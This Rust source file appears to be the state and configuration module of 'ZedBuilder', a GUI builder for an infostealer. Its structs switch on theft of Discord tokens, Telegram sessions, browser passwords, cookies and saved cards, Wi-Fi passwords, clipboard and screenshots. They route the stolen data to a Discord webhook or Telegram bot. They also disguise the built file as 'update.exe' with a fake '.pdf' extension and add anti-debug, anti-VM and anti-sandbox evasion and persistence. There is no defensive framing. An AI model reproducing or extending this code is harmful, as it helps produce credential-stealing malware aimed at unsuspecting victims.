use serde::{Deserialize, Serialize};
use std::sync::mpsc;
use std::thread::JoinHandle;
use std::path::PathBuf;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum Page {
    Home,
    Builder,
    Compiler,
    Settings,
}

impl Default for Page {
    fn default() -> Self {
        Page::Home
    }
}

impl Page {
    pub fn label(&self) -> &'static str {
        match self {
            Page::Home     => "Home",
            Page::Builder  => "Builder",
            Page::Compiler => "Compiler",
            Page::Settings => "Settings",
        }
    }

    pub fn icon(&self) -> &'static str {
        match self {
            Page::Home     => "~",
            Page::Builder  => "#",
            Page::Compiler => ">",
            Page::Settings => "=",
        }
    }

    /// Short ASCII icon text safe for all fonts
    pub fn icon_text(&self) -> &'static str {
        match self {
            Page::Home     => "[~]",
            Page::Builder  => "[#]",
            Page::Compiler => "[>]",
            Page::Settings => "[=]",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeliveryConfig {
    pub use_discord:       bool,
    pub discord_webhook:   String,
    pub use_telegram:      bool,
    pub telegram_token:    String,
    pub telegram_chat_id:  String,
}

impl Default for DeliveryConfig {
    fn default() -> Self {
        Self {
            use_discord:      true,
            discord_webhook:  String::new(),
            use_telegram:     false,
            telegram_token:   String::new(),
            telegram_chat_id: String::new(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StealerFeatures {
    // Discord
    pub discord_tokens:       bool,
    pub discord_nitro_check:  bool,
    pub discord_friends:      bool,
    // Telegram
    pub telegram_sessions:    bool,
    // Browsers
    pub browser_cookies:      bool,
    pub browser_passwords:    bool,
    pub browser_history:      bool,
    pub browser_cards:        bool,
    pub browser_autofill:     bool,
    // Browser targets
    pub target_chrome:        bool,
    pub target_firefox:       bool,
    pub target_edge:          bool,
    pub target_brave:         bool,
    pub target_opera:         bool,
    // System
    pub system_info:          bool,
    pub hardware_info:        bool,
    pub network_info:         bool,
    pub screenshot:           bool,
    pub webcam:               bool,
    // Misc
    pub clipboard:            bool,
    pub wifi_passwords:       bool,
    pub installed_apps:       bool,
    pub startup_files:        bool,
}

impl Default for StealerFeatures {
    fn default() -> Self {
        Self {
            discord_tokens:      true,
            discord_nitro_check: true,
            discord_friends:     false,
            telegram_sessions:   true,
            browser_cookies:     true,
            browser_passwords:   true,
            browser_history:     false,
            browser_cards:       true,
            browser_autofill:    false,
            target_chrome:       true,
            target_firefox:      true,
            target_edge:         true,
            target_brave:        true,
            target_opera:        true,
            system_info:         true,
            hardware_info:       true,
            network_info:        true,
            screenshot:          true,
            webcam:              false,
            clipboard:           true,
            wifi_passwords:      true,
            installed_apps:      false,
            startup_files:       false,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CompilerConfig {
    pub output_name:      String,
    pub use_icon:         bool,
    pub fake_extension:   String,
    pub compress:         bool,
    pub encrypt_payload:  bool,
    pub anti_debug:       bool,
    pub anti_vm:          bool,
    pub anti_sandbox:     bool,
    pub persistence:      bool,
    pub self_destruct:    bool,
    pub mutex:            bool,
    pub mutex_name:       String,
    pub melt:             bool,
}

impl Default for CompilerConfig {
    fn default() -> Self {
        Self {
            output_name:     String::from("update.exe"),
            use_icon:        false,
            fake_extension:  String::from(".pdf"),
            compress:        true,
            encrypt_payload: true,
            anti_debug:      true,
            anti_vm:         true,
            anti_sandbox:    true,
            persistence:     false,
            self_destruct:   false,
            mutex:           true,
            mutex_name:      String::from("ZedMx_7f2a"),
            melt:            false,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AppSettings {
    pub theme_pink:    f32,
    pub auto_save:     bool,
    pub notifications: bool,
}

impl Default for AppSettings {
    fn default() -> Self {
        Self {
            theme_pink:    1.0,
            auto_save:     true,
            notifications: true,
        }
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub struct AppState {
    pub current_page: Page,
    pub features:     StealerFeatures,
    pub delivery:     DeliveryConfig,
    pub compiler:     CompilerConfig,
    pub settings:     AppSettings,

    #[serde(skip)]
    pub build_progress:    f32,
    #[serde(skip)]
    pub is_building:       bool,
    #[serde(skip)]
    pub build_log:         Vec<String>,
    #[serde(skip)]
    pub build_output_path: Option<String>,
    #[serde(skip)]
    pub sidebar_hover:     Option<Page>,

    /// Channel receiver from runner thread (log lines)
    #[serde(skip)]
    pub build_log_rx: Option<mpsc::Receiver<String>>,
    /// Runner thread handle
    #[serde(skip)]
    pub build_handle: Option<JoinHandle<Result<String, String>>>,
}

impl Default for AppState {
    fn default() -> Self {
        Self {
            current_page:      Page::default(),
            features:          StealerFeatures::default(),
            delivery:          DeliveryConfig::default(),
            compiler:          CompilerConfig::default(),
            settings:          AppSettings::default(),
            build_progress:    0.0,
            is_building:       false,
            build_log:         Vec::new(),
            build_output_path: None,
            sidebar_hover:     None,
            build_log_rx:      None,
            build_handle:      None,
        }
    }
}

impl AppState {
    /// Returns `%APPDATA%\ZedBuilder\config.json`
    fn config_path() -> Option<PathBuf> {
        let appdata = std::env::var("APPDATA").ok()?;
        let dir = PathBuf::from(appdata).join("ZedBuilder");
        std::fs::create_dir_all(&dir).ok()?;
        Some(dir.join("config.json"))
    }

    /// Persist the current config to disk (only the serialisable fields).
    pub fn save_config(&self) {
        if let Some(path) = Self::config_path() {
            if let Ok(json) = serde_json::to_string_pretty(self) {
                let _ = std::fs::write(path, json);
            }
        }
    }

    /// Load a previously saved config from disk.
    /// Returns `AppState::default()` if the file is absent or malformed.
    pub fn load_config() -> Self {
        if let Some(path) = Self::config_path() {
            if let Ok(json) = std::fs::read_to_string(path) {
                if let Ok(state) = serde_json::from_str::<AppState>(&json) {
                    return state;
                }
            }
        }
        AppState::default()
    }
}

/// A Clone that skips non-Clone fields (channel + handle)
impl Clone for AppState {
    fn clone(&self) -> Self {
        Self {
            current_page:      self.current_page,
            features:          self.features.clone(),
            delivery:          self.delivery.clone(),
            compiler:          self.compiler.clone(),
            settings:          self.settings.clone(),
            build_progress:    self.build_progress,
            is_building:       self.is_building,
            build_log:         self.build_log.clone(),
            build_output_path: self.build_output_path.clone(),
            sidebar_hover:     self.sidebar_hover,
            build_log_rx:      None,   // not cloneable — intentionally dropped
            build_handle:      None,   // not cloneable
        }
    }
}
